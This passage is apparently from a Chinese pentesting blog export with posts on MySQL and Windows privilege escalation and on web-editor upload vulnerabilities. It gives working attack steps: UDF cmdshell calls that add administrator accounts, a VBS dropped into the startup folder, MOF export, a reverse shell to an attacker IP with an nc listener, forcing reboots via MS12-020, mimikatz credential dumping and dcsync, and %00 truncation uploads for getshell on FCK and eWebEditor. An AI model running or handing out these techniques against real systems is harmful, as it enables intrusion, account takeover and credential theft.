SQL2005开启&#x27;sp_oacreate&#x27;支持的方法:exec sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1;RECONFIGURE;\n mysql 提权\n\n\nUDF 提权\n启动项提权\nMOF 提权\n反链端口提权\n\n\n udf 提权\n\n获取到对方的 mysql 数据库下的 root 账号密码\n\n\n查看网站源码里面数据库配置文件（inc，conn，config.sql，common，data等）\n\n\n查看数据库安装路径下的 user.myd（/data/mysql/）下载，本地替换\nmysqld --skip-grant-tables 跳过验证\nmysql.exe -uroot 进入MySQL\n\n\n暴力破解 mysql 密码破解 3306 端口入侵\n\n\nudf 提权原理：通过 root 权限导出 udf.dll 到系统目录下，可以通过 udf.dll 调用执行 cmd\n\n\nmysql 提权：\n\n\nroot 账号的获取：\n可以通过网站源码获取 (conn.php config.php/ dbconfig.php db.php config.inc.php common.inc.php)，但是大概率通过这种方法只能获取到一个普通用户的账号\n假如说我们获取到的是一个以网站命名的账号：xycms，那么这个时候我们就需要分析网站的属性了：\n\n假如说我们拿到的是阿里云的虚拟机，里面有300多个站点，那这里面的数据库账号一般都是普通权限，因为虚拟主机会根据不同的站点创建不同的数据库用户来连接数据库\n如果站点是企业自己的服务器，站点不多，那么大概率每一个站点连接的数据库都是管理员的（单个服务器单个站点或者一个企业属性的站点群）这种站点一般防护都很一般\n\n我们得到的账号不是 root 并不代表它就不是 root 权限，可以链接查看，如果能对 mysql数据库进行操纵一般就是管理员\n\n\n爆破（默认不能通过外部地址爆破 root）\n只能爆破127 或者 localhost，这个时候就可以考虑去上传一些大马，也可以上传完木马之后，抓包然后爆破密码：\n\n如果我们可以通过 webshell 连接的话，我们可以进入到 mysql 数据库的 user 表中查看管理员用户的账密，那么这个时候问题来了，假如说这些 user 表文件数据显示不完全怎么办？这个时候就可以来到本地的数据库，然后将目标的三个文件下载到本地，并且将本地的数据库中的 user 表文件替换\n\n这个时候我们本地的数据库账号以及密码已经修改为了目标的，那我们应该如何登录呢？可以直接使用命令：mysqld --skip-grant-tables ，这个命令可以让我们直接跳过密码验证，这个时候我们就不需要密码直接回车就可以登录\n\n\n进入之后直接：use mysql select * from user\n\n\n\nUDF 提权，首先，我们可以将脚本上传到目标，然后进行访问，可以看到它先是确定是否存在 plugin 目录，如果不存在的话，我们可以直接点击旁边的 Create PluginDir来创建这个目录\n\n创建成功之后就可以导入udf.dll，这个文件就在我们的脚本里面，然后创建函数，之后我们就可以通过这个创建的函数执行命令了\n\n\n\n\n# udf提权C:\\Winnt\\udf.dll 2000C:\\Windows\\udf.dll 2003现在基本上 win 的服务器就这两个导出 UDF.DLL5.1以上版本需要导出到 mysql 安装目录lib\\plugin\\create function cmdshell returns string soname &#x27;udf.dll&#x27;select cmdshell(&#x27;net user cracker cracker /add&#x27;);select cmdshell(&#x27;net localgroup administrators cracker /add&#x27;);drop function cmdshell;删除函数\n 启动项提权\n\n\n查看我们进入数据库中有些什么数据表\nshow tables; 默认的情况下，test 中没有任何表的存在。\n\n\n在 TEST 数据库下创建一个新的表；\ncreate table a (cmd text);\n好了，我们创建了一个新的表，表名为a，表中只存放一个字段，字段名为 cmd，为 text 文本。\n\n\n在表中插入内容\ninsert into a values (&quot;set wishshell=createobject (&quot;&quot;wscript.shell&quot;&quot;)&quot;);insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user 1 1 /add&quot;&quot;,0)&quot;);insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators 1 /add&quot;&quot;,0)&quot;);\n注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个 VBS 的脚本程序！\n\n\n现在我们来看看表 a 中有些什么\nselect * from a;\n我们将会看到表中有三行数据，就是我们刚刚输入的内容，确认你输入的内容无误后，我们来到下一步\n\n\n输出表为一个VBS的脚本文件\n# 这一步是将这个脚本文件加入到启动项里面select * from a into outfile &quot;c://docume~1//administrator//「开始」菜单//程序//启动 //a.vbs;&quot;;\n\n\n重启即可！\n\n\n目标的电脑一旦重启就会创建一个系统管理员的账号，那么问题来了，假如他不重启怎么办呢？这个时候就可以使用MSF上面的ms12-020，可以让目标蓝屏，只要蓝屏他一定会重启\n mof 提权\n\n\n第一种方法：\n\n上传 mof.php\n输入相关信息，执行命令，提权。\n\n\n\n第二种方法：\n\n\n上传文件 x.mof\n\n\n使用 select 命令导出到正确位置\nselect load file(&#x27;C:/wmpub/nullevt.mof&#x27;) into dumplile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;\n\n\n允许外部地址使用 root 用户连接的 sql 语句\nGrant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;root&#x27; with grant option;\n\n\n\n\n 反链端口提权\n利用 mysql 客户端工具连接 mysql 服务器，然后执行命令：\nmysql.exe -h 172.16.10.11 -uroot -pEnter password:mysql&gt; \\. c:\\mysql.txtmysql&gt;select backshell(&quot;YourIP&quot;,2010);\n本地监听你反弹的端口：nc.exe -vv -l -p 2010 ，成功后你将获得一个 system权限的 cmdshell，其实这个也是利用的UDF提权\n HASH获取与破解\n需要管理员权限方可执行读取hash操作：gethashes.exe $local\ngsecdump-h 显示帮助-a 获取所有密码信息-s 从sam文件和域控中获取hash值-U 获取当前登录用户的hash-w 获取无线密码\n也可以使用 pwdump7.exe 获取 hash\n mimikatz 使用\n\n\nmimikatz 使用时需要高权限，至少是 administrator 权限\n\n\nmimikatz 抓取密码的命令需要 system 权限，可以先进行提权\n\nprivilege::debug  # 提升权限（从 administrator 提升到 system）\n\n\n\n抓取 hash\n\nsekurlsa::logonpasswords  # 获取当前在线用户的明文密码（需要高权限运行）\nlsadump::isa /patch  # 获取当前此计算机存在过用户的NTLMHASH\n\n\n\nmimikatz的其他命令\n\nlsadump::sam SYSTEM.hiv  # 导出所有用户口令 使用 Value Shadow Copy 获得 SYSTEM、SAM 备份\n\n\n\n通过内存文件获取口令\n\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonPasswords full\n拉取 rd.adsecurity.org 域中的 KRBTGT 用户帐户的密码数据\nlsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt\n拉取 lab.adsecurity.org 域中 ADSDCO3 域控制器的计算机帐户的密码数据\nlsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$\n\n\n\n hash 破解工具\nsaminsideoclhasheatLC5Ophcrackjohn the Ripper\n 漏洞利用与提权\n 补丁提取\n# 利用补丁提取脚本wmic qfe get Caption, description, hotfixid, installedonsysteminfo\n windows-exploit-suggester\n用来查看哪些补丁漏洞是可以使用的，使用方法如下：\nwindows-exploit-suggester.py --update\n将服务器执行 systeminfo &gt; a.txt\nwindows-exploit-suggester.py --database 2019-01-01-mssb.xls --systeminfo a.txtwindows-exploit-suggester.py --audit --database 2019-01-01-mssb.xls --systeminfo a.txtwindows-exploit-suggester.py --audit -l --database 2019-01-01-mssb.xls --systeminfo a.txt\n 常用的漏洞库网站\nhttps://exploit-db.comhttps://packetstormsecurity.comhttps://packetstormsecurity.com/search/?q=ms15-057https://www.securityfocus.com/https://www.securityfocus.com/bidhttp://1337day.comhttp://0day.todayhttp://seclists.org/fulldisclosurehttp://exploitsearch.nethttp://www.securityteam.comhttp://metasploit.com/moduleshttp://securityreason.comhttps://cxsecurity.com/exploithttp://securitytracker.com\n 使用MSF提权\n 破解服务应用密码提权\n","tags":["提权"]},{"title":"编辑器漏洞","url":"/2024/12/09/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/","content":"\n编辑器配合解析漏洞利用\n编辑器自身的漏洞利用\n比如说我们要搭建一个博客，就可能用到 wordpress、emlog、zblog，那比如我要搭建一个论坛，就可能用到 dz，搭建企业网站可能会用到 dedecms 等等这些 CMS，这些CMS的源码里面就可能会调用一些编辑器，比如说：eweb、fck、kindeditor、ueditor、ckfinder、texteditor，这些编辑器都是有专门的团队运营开发的，我们可以直接在CMS写好之后，直接使用接口进行调用就可以了\n源码本身可能没有漏洞，但是编辑器可能存在漏洞。如果网站本身找不到漏洞的话，我们就可以侧重于挖掘一下编辑器漏洞\n\n 编辑器路径查找\n\n\n\n\n确定编辑器\n网站可能会存在多个编辑器\n端口搭建的站点 经常存在编辑器漏洞\n编辑器不一定在根目录下面，也可能在二级目录下面\n一般情况下，带有 editor 或 edit 的都是编辑器的目录\n编辑器还会有一些固定的目录：ewebeditor.asp/htm 或 html 可以尝试访问一下\n\n\n找编辑器版本对应的漏洞\n\n\n漏洞利用\n\n\n\n FCK编辑器漏洞\n\nfckeditor\n一般放在根目录\n有可能也放在admin目录下\ninclude目录下 echosp cms\n\n\n一般存在 /usrfiles/image 这种目录都是使用的 FCK编辑器\n\nfck  ==&gt;  更新之后：ckeditor（漏洞相对较少）\n针对于版本漏洞利用\nfck &lt; 2.6.4\nfck配合解析漏洞利用\n看看网站容器有没有可以利用的解析漏洞\n查看编辑器版本找上传点 找漏洞利用\nIIS6.0存在很多解析漏洞，可以在上传文件的时候进行利用，比如：目录解析、畸形文件名解析、分号解析\n利用截断直接 getshell ：\n\n点前截断：1.asp%00.jpg （这个大概率会被再次解析为 jpg 文件）\n点后截断：1.asp%00jpg （选中 %00，然后 ctrl+shift+u 进行编码）\n\n\n\n版本：2.4\n\n配合解析漏洞\n利用%00截断getshell\n\n版本：2.5\n\n\n利用解析漏洞 递归创建 a.asp/1.asp\n\n\n利用%00截断getshell：a.asp%00jpg a.asp%00.jpg 这两种截断都要进行一下尝试\n如果碰到阿里云，上传后的文件名会被改为 a_asp，还会封你 IP\n解决方案：换 ip上传，截断连发三个包\n\na_asp\na(1)_asp\na(1).asp\n\n这种适用于 2.4.3 以下的，因为2.6.4以上的就会重命名为时间戳\n\n\n版本：2.6.3\n\n\n依旧可以尝试抓包进行截断：\n版本要求：[2.6.0，2.6.3]\n截断格式：URL %2F 00截断\n\n%2Fa.php%00：%2F是它本身就有的也就是/，我们可以上传一个1.jpg文件，然后抓包直接在%2F后面跟一个 a.php 之后使用 %00 截断，这样就可以在image目录下面创建出：image/a.php/1.jpg\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n EWEB编辑器漏洞\n\n\n\n找后台-登录后台-修改上传类型或上传样式，-getshell\neweb后台\newebeditor目录下：\nadmin/login.asp/php/aspx/jsp\nadmin_login.asp\nadmin_style.asp\n想办法登录后台：\n\n\n尝试弱口令\n\n\n爆破\n\n\n下载默认数据库地址（可以尝试一下下面的地址，如果有数据库的话会直接下载）\n/ewebeditor/db/ewebeditor.mdb\n/ewebeditor/db/%23ewebeditor.mdb (有一些如果把#修改为%23就可以下载数据库)\n/ewebeditor/db/data.mdb\n/ewebeditor/db/db.mdb\n适用于03 iis6.版本可以下载，如果是08以上的服务器，禁止下载mdb文件\n\n\n注入得到账号密码\n\n\n\n\n如果没后台-或者进不去后台\n通过目录遍历漏洞（…/…），找网站数据库地址，下载网站数据库 解密-登录网站后台-getshell\n百度查找编辑器对应漏洞利用，找相关的EXP\n如果之前被别人修改过上传类型，可以下载数据库查看类型样式id，构造上传getshell\n\n\n\n 其他编辑器利用\n CKFinder任意文件上传漏洞\n\n 南方数据编辑器southidceditor\n\n\n ueditor\n\n DotNetTextBox编辑器漏洞\n\n\n phpweb网站管理系统后台kedit编辑器\n\n Cute Editor在线编辑器本地包含漏洞\n\n Cute Editor Asp.Net版利用iis解析漏洞获得权限\n\n","tags":["内网渗透"]}]